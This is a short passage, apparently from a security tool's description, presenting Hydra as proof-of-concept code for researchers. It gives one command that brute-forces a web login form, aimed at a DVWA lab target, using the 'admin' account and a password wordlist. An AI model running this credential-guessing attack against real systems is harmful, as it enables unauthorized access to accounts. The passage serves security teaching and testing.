Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system.

```bash
hydra -V -l admin -P /path/to/wordlist.txt <ip> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
